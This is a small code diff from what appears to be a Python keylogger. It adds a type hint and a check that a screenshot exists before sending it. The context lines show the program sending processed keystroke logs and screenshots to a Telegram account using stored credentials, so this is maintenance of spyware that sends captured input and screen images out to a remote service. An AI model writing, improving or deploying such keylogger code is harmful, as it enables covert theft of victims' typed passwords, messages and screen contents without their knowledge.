@@ -12,7 +12,7 @@ from log_utils import format_message, process_keys, write_to_log
 from notifications_utils import send_image_telegram, send_info_telegram
 
 
-def handle_keyboard_interrupt(key_listener):
+def handle_keyboard_interrupt(key_listener: KeyListener):
     """
     Handle a keyboard interrupt event.
 
@@ -77,7 +77,8 @@ def main():
             send_info_telegram(**creds,
                                message='PROCESSED KEYLOGGER LOG\n\n' +
                                processed_message)
-            send_image_telegram(**creds, image=screenshot)
+            if screenshot is not None:
+                send_image_telegram(**creds, image=screenshot)
 
     except KeyboardInterrupt:
         handle_keyboard_interrupt(key_listener)
